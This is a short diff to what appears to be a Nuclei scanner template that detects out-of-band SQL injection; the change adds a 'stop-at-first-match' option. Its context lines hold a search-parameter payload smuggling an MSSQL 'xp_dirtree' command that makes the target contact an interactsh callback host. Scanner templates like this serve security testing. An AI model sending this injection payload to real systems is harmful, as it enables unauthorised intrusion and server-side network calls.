@@ -11,6 +11,7 @@ http:
     path:
       - "{{BaseURL}}/?search=1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\abc'--"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
